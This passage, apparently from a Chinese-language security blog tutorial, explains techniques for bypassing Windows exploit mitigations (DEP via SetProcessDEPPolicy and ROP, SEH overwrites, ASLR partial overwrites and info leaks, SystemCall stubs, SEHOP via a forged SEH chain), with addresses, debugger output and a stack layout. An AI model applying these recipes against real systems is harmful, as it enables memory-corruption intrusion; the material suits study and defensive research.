&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;BOOLWINAPI &lt;span class=&quot;title&quot;&gt;SetprocessDEPPolicy&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        __in DWORD dwFlags&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;DWORD dwDWORD dw这个函数需要一个参数，并且这个参数必须设置为0，以此禁用当前进程的DEP。&lt;br&gt;为了在ROP 链中使用这个函数，你需要在栈上这样设置：&lt;br&gt;●指向SetProcessDEPPolicy 的指针&lt;br&gt;●指向shellcode 的指针&lt;br&gt;●0&lt;br&gt;指向shellcode 的指针用于确保当SetProcessDEPPolicy()执行完ROP链后会跳到shellcode。&lt;br&gt;在XP SP3 下SetProcessDEPPolicy 的地址是7C8622A4（kernel32.dll）&lt;/p&gt;
&lt;h4 id=&quot;5-利用WPN与ROP技术&quot;&gt;&lt;a href=&quot;#5-利用WPN与ROP技术&quot; class=&quot;headerlink&quot; title=&quot;5.利用WPN与ROP技术&quot;&gt;&lt;/a&gt;5.利用WPN与ROP技术&lt;/h4&gt;&lt;p&gt;ROP（Return Oriented Programming）:连续调用程序代码本身的内存地址，以逐步地创建一连串欲执行的指令序列。&lt;br&gt;WPM（Write Process Memory）：利用微软在kernel32.dll中定义的函数比如：WriteProcess Memory函数可将数据写入到指定进程的内存中。但整个内存区域必须是可访问的，否则将操作失败。&lt;br&gt;具体实现方法参见我之前翻译的文章《利用WPN与ROP技术绕过DEP》：&lt;a href=&quot;http://bbs.pediy.com/showthread.php?t=119300&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bbs.pediy.com/showthread.php?t=119300&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;6-利用SEH-绕过DEP&quot;&gt;&lt;a href=&quot;#6-利用SEH-绕过DEP&quot; class=&quot;headerlink&quot; title=&quot;6.利用SEH 绕过DEP&quot;&gt;&lt;/a&gt;6.利用SEH 绕过DEP&lt;/h4&gt;&lt;p&gt;启用DEP后，就不能使用pop pop ret地址了，而应采用pop reg/pop reg/pop esp/ret 指令的地址，指令pop esp 可以改变堆栈指针，ret将执行流转移到nseh 中的地址上（用关闭NX 例程的地址覆盖nseh，用指向pop/pop/pop esp/ret 指令的指针覆盖异常处理器）。&lt;br&gt;辅助工具：ImmDbg插件!pvefindaddr&lt;/p&gt;
&lt;h2 id=&quot;四、ASLR&quot;&gt;&lt;a href=&quot;#四、ASLR&quot; class=&quot;headerlink&quot; title=&quot;四、ASLR&quot;&gt;&lt;/a&gt;四、ASLR&lt;/h2&gt;&lt;h3 id=&quot;原理-5&quot;&gt;&lt;a href=&quot;#原理-5&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;ASLR（地址空间布局随机化）技术的主要功能是通过对系统关键地址的随机化，防止攻击者在堆栈溢出后利用固定的地址定位到恶意代码并加以运行。它主要对以下四类地址进行随机化：&lt;br&gt;(1)堆地址的随机化；&lt;br&gt;(2)栈基址的随机化；&lt;br&gt;(3)PE文件映像基址的随机化；&lt;br&gt;(4)PEB(Process Environment Block，进程环境块)地址的随机化。&lt;br&gt;它在vista,windows 2008 server,windows7下是默认启用的（IE7除外），非系统镜像也可以通过链接选项/DYNAMICBASE(Visual Studio 2005 SP1 以上的版本，VS2008 都支持)启用这种保护,也可手动更改已编译库的dynamicbase 位，使其支持ASLR 技术(把PE 头中的DllCharacteristics 设置成0x40 -可以&lt;br&gt;使用工具PE EXPLORER 打开库，查看DllCharacteristics 是否包含0x40 就可以知道是否支持ASLR 技术)。另外，也可以使用Process Explorer来查看是否开启ASLR。启用ASLR后，即使你原先已经成功构造出exploit，但在系统重启后，你在exploit中使用的一些固定地址就会被改变，进而导致exploit失效。&lt;/p&gt;
&lt;h3 id=&quot;绕过方法：-3&quot;&gt;&lt;a href=&quot;#绕过方法：-3&quot; class=&quot;headerlink&quot; title=&quot;绕过方法：&quot;&gt;&lt;/a&gt;绕过方法：&lt;/h3&gt;&lt;h4 id=&quot;1-覆盖部分返回地址&quot;&gt;&lt;a href=&quot;#1-覆盖部分返回地址&quot; class=&quot;headerlink&quot; title=&quot;1.覆盖部分返回地址&quot;&gt;&lt;/a&gt;1.覆盖部分返回地址&lt;/h4&gt;&lt;p&gt;对比下windows7系统启动前后OD中loaddll.exe的各模块基址，启动前：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;可执行模块&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;基址       大小       入口       名称       文件版本          路径&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;00400000   00060000   00410070   loaddll                      D:\riusksk\TOOL\Ollydbg\loaddll.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6DDE0000   0008C000   6DDE1FFF   AcLayers   6.1.7600.16385 (  C:\Windows\AppPatch\AcLayers.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;710E0000   00012000   710E1200   mpr        6.1.7600.16385 (  C:\Windows\System32\mpr.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71C50000   00051000   71C79834   winspool   6.1.7600.16385 (  C:\Windows\System32\winspool.drv&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;747F0000   00017000   747F1C89   userenv    6.1.7600.16385 (  C:\Windows\System32\userenv.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;750A0000   0001A000   750A2CCD   sspicli    6.1.7600.16385 (  C:\Windows\System32\sspicli.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;750C0000   0004B000   750C2B6C   apphelp    6.1.7600.16385 (  C:\Windows\System32\apphelp.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75190000   0000B000   75191992   profapi    6.1.7600.16385 (  C:\Windows\System32\profapi.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75420000   0004A000   75427A9D   KERNELBA   6.1.7600.16385 (  C:\Windows\system32\KERNELBASE.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75B50000   0000A000   75B5136C   LPK        6.1.7600.16385 (  C:\Windows\system32\LPK.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75B60000   0004E000   75B6EC49   GDI32      6.1.7600.16385 (  C:\Windows\system32\GDI32.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;……&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;系统重启后：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;可执行模块&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;基址       大小       入口       名称       文件版本          路径&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;00400000   00060000   00410070   loaddll                      D:\riusksk\TOOL\Ollydbg\loaddll.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6F510000   0008C000   6F511FFF   AcLayers   6.1.7600.16385 (  C:\Windows\AppPatch\AcLayers.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;715B0000   00012000   715B1200   mpr        6.1.7600.16385 (  C:\Windows\System32\mpr.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72170000   00051000   72199834   winspool   6.1.7600.16385 (  C:\Windows\System32\winspool.drv&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74C70000   00017000   74C71C89   userenv    6.1.7600.16385 (  C:\Windows\System32\userenv.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75520000   0001A000   75522CCD   sspicli    6.1.7600.16385 (  C:\Windows\System32\sspicli.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75540000   0004B000   75542B6C   apphelp    6.1.7600.16385 (  C:\Windows\System32\apphelp.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75610000   0000B000   75611992   profapi    6.1.7600.16385 (  C:\Windows\System32\profapi.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75690000   0004A000   75697A9D   KERNELBA   6.1.7600.16385 (  C:\Windows\system32\KERNELBASE.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;759B0000   000CC000   759B168B   msctf      6.1.7600.16385 (  C:\Windows\System32\msctf.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75E60000   000AC000   75E6A472   msvcrt     7.0.7600.16385 (  C:\Windows\system32\msvcrt.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75F10000   0004E000   75F1EC49   GDI32      6.1.7600.16385 (  C:\Windows\system32\GDI32.dll&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;……&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由此可见，各模块基址的高位是随机变化的，而低位是固定不变的，这里loaddll.exe不受ADSL保护，所以其基址没有随机化，如果是Notepad.exe就有启用ASLR，还有其它经链接选项/DYNAMICBASE编译的程序也会启用ASLR。因此我们可以让填充字符只覆盖到返回地址的一半，由于小端法机器的缘故，其低位地址在前，因此覆盖到的一半地址刚好处于低位，而返回地址的高位我们让它保持不变，所以我们必须在返回地址之前的地址范围内（相当于漏洞函数所在的255字节空间地址）查找出一个可跳转到shellcode的指令，比如jmp edx(关键看哪一寄存器指向shellcode)。除此之外，我们还必须将shellcode放在返回地址之前，不然连返回地址的高位也覆盖掉了，这是不允许的。纵观此法，相当的有局限性，如果漏洞函数过短，可能就没有我们需要的指令了，这时就得另寻他法了。&lt;/p&gt;
&lt;h4 id=&quot;2-利用未启用ASLR的模块地址&quot;&gt;&lt;a href=&quot;#2-利用未启用ASLR的模块地址&quot; class=&quot;headerlink&quot; title=&quot;2.利用未启用ASLR的模块地址&quot;&gt;&lt;/a&gt;2.利用未启用ASLR的模块地址&lt;/h4&gt;&lt;p&gt;这与之前绕过SafeSEH的方法类似，直接在未受ASLR保护的模块中查找跳转指令的地址来覆盖返回地址或者SEH结构，比如上方的可执行模块列表中的loaddll.exe地址就是固定不变，因此我们借助其地址空间中的指令来实现跳板。这个可以通过Process Explorer或者ImmDbg命令插件来查看哪些可执行模块未受ASDL保护!ASLRdynamicbase或者(!pvefindaddr noaslr)：来查看哪些进程模块启用ASLR保护。&lt;/p&gt;
&lt;h4 id=&quot;3-heap-spary&quot;&gt;&lt;a href=&quot;#3-heap-spary&quot; class=&quot;headerlink&quot; title=&quot;3.heap spary&quot;&gt;&lt;/a&gt;3.heap spary&lt;/h4&gt;&lt;p&gt;具体利用方法同上，这里不再赘述。&lt;/p&gt;
&lt;h4 id=&quot;4-利用内存信息泄漏&quot;&gt;&lt;a href=&quot;#4-利用内存信息泄漏&quot; class=&quot;headerlink&quot; title=&quot;4.利用内存信息泄漏&quot;&gt;&lt;/a&gt;4.利用内存信息泄漏&lt;/h4&gt;&lt;p&gt;通过获取内存中某些有用的信息，或者关于目标进程的状态信息，攻击者通过一个可用的指针就有可能绕过ASLR。这种方法还是十分有效的，主要原因如下：&lt;br&gt;（1）可利用指针检测对象在内存中的映射地址。比如栈指针指向内存中某线程的栈空间地址，或者一静态变量指针可泄露出某一特定DLL/EXE的基址。&lt;br&gt;（2）通过指针推断出其他附加信息。比如栈桢中的桢指针不仅提供了某线程栈空间地址，而且提供了栈桢中的相关函数，并可通过此指针获得前后栈桢的相关信息。再比如一个数据段指针，通过它可以获得其在内存中的映像地址，以及单数据元素地址。若是堆指针还可获得已分配的数据块地址，这些信息在程序攻击中还是着为有用的。&lt;br&gt;在Vista系统的ASLR中，信息泄漏的可用性更广了。如果攻击者知道内存中某一映射地址，那么他不仅可获取对应进程中的DLL地址，连系统中运行的所有进程也会遭殃。因为其他进程在重新加载同一DLL时，是通过特定地址上的_MiImageBitMap变量来搜索内存中的DLL地址的，而这一bitmap又被用于所有进程，因此找到一进程中某DLL的地址，即可在所有进程的地址空间中定位出该DLL地址。&lt;/p&gt;
&lt;h4 id=&quot;5-利用SystemCall&quot;&gt;&lt;a href=&quot;#5-利用SystemCall&quot; class=&quot;headerlink&quot; title=&quot;5.利用SystemCall&quot;&gt;&lt;/a&gt;5.利用SystemCall&lt;/h4&gt;&lt;p&gt;（1）在SystemCall 地址0x7ffe0300上是没有被随机化的，下面是我在win7 中文旗舰版上的情况：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; dt _KUSER_SHARED_DATA 0x7ffe0000&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!_KUSER_SHARED_DATA&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;…&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   +0x300 SystemCall       : 0x77966340&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   +0x304 SystemCallReturn : 0x77966344&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; u 77966340&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!KiFastSystemCall:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77966340 8bd4            mov     edx,esp&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77966342 0f34            sysenter&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（2）– Windows 用户模式进入内核模式时：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; u ZwCreateProcess&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!NtCreateProcess:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77964940 b84f000000      mov     eax,4Fh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77964945 ba0003fe7f      mov     edx,offset SharedUserData!SystemCallStub (7ffe0300)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7796494a ff12            call    dword ptr [edx]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7796494c c22000          ret     20h&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;– 通过手工构造System Call的参数&lt;br&gt;– 并且用System Call的技术来绕过DEP&amp;amp;ALSR&lt;/p&gt;
&lt;p&gt;（3）IE MS08-078 exploit with SystemCall on windows&lt;br&gt;– 通过堆喷射的方法在内存中填充SystemCall的地址&lt;br&gt;– 在exploit中使用SystemCall地址&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;.text:461E3D30 mov eax, [esi] //eax==0x0a0a11c8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ….        // 0x11c8 be a systemcall ID&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:461E3D4C mov ecx, [eax]   //[0x0a0a11c8]==0x7ffe027c&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:461E3D4E push edi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:461E3D4F push eax   //eax==0x0a0a11c8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:461E3D50 call dword ptr [ecx+84h] //call [0x7FFE0300] SystemCall&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;以上代码等同于调用NtUserLockWorkStation&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mov eax,11c8h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov edx,offset SharedUserData!SystemCallStub (7ffe0300)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;call dword ptr [edx]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;（4）System call on x64&lt;br&gt;– 7ffe0300 不再存放KiFastSystemCall的地址&lt;br&gt;– 通过call dword ptr fs:[0C0h]指令来代替系统调用的方法&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; u NtQueryInformationToken&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!NtQueryInformationToken:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77d9fb38 b81e000000 mov eax,1Eh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77d9fb3d 33c9 xor ecx,ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77d9fb3f 8d542404 lea edx,[esp+4]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77d9fb43 64ff15c0000000 call dword ptr fs:[0C0h]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77d9fb4a 83c404 add esp,&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;五、SEHOP&quot;&gt;&lt;a href=&quot;#五、SEHOP&quot; class=&quot;headerlink&quot; title=&quot;五、SEHOP&quot;&gt;&lt;/a&gt;五、SEHOP&lt;/h2&gt;&lt;h3 id=&quot;原理-6&quot;&gt;&lt;a href=&quot;#原理-6&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;微软在Microsoft Windows 2008 SP0、Microsoft Windows Vista SP1和Microsoft Windows 7中加入了另一种新的保护机制SEHOP（Structured Exception Handling Overwrite Protection），它可作为SEH的扩展，用于检测SEH是否被覆写。SEHOP的核心特性是用于检测程序栈中的所有SEH结构链表的完整性，特别是对最后一个SHE结构的检测。在最后一个SEH结构中拥有一个特殊的异常处理函数指针，指向一个位于ntdll中的函数ntdll!FinalExceptHandler（）。当我们用jmp 06 pop pop ret 来覆盖SEH结构后，由于SEH结构链表的完整性遭到破坏，SEHOP就能检测到异常从而阻止shellcode的运行&lt;/p&gt;
&lt;h3 id=&quot;绕过方法-2&quot;&gt;&lt;a href=&quot;#绕过方法-2&quot; class=&quot;headerlink&quot; title=&quot;绕过方法&quot;&gt;&lt;/a&gt;绕过方法&lt;/h3&gt;&lt;p&gt;伪造SEH链表&lt;br&gt;由于SEHOP会检测SEH链表的完整性，那么我们可以通过伪造SEH链表来替换原先的SEH链表，进而达到绕过的目的。具体实现方法：&lt;/p&gt;
&lt;p&gt;（1）查看SEH链表结构，可借助OD实现，然后记住最后一个SEH结构地址，以方便后面的利用；&lt;br&gt;（2）用JE(0x74) + 最后一个SEH结构的地址（由于地址开头是00，故可省略掉，可由0x74替代，共同实现4字节对齐）去覆盖nextSEH；&lt;br&gt;（3）用xor pop pop ret指令地址去覆盖SEH handle，其中的xor指令是用于将ZF置位，使前面的JE = JMP指令，进而实现跳转；&lt;br&gt;（4）在这两个SEH结构之前写入一跳转指令（JMP+8），以避免数据段被执行；&lt;br&gt;（5）在这两个SEH结构之间全部用NOP填充，如果两者之间还有其它SEH结构的话；&lt;br&gt;（6）将shellcode放置在最后一个SEH结构之后，即ntdll!FinalExceptHandler（）函数之后。&lt;/p&gt;
&lt;p&gt;此时的堆栈布局如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;┏━━━━━━━━━━━━┓&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【    NOP…      】  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【   JMP 08     】  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  JE XXXXXX   】&amp;lt;= next SEH(指向前面的NOP)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【     xor pop pop ret    】&amp;lt;= SEH Handler&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【    NOP…      】&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【   JMP 08     】&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  0xFFFFFFFF    】&amp;lt;= next SEH &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【ntdll!FinalExceptHandler】&amp;lt;= SEH Handler&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;【  shellcode   】&lt;/span&gt;&lt;br&gt;&lt;span 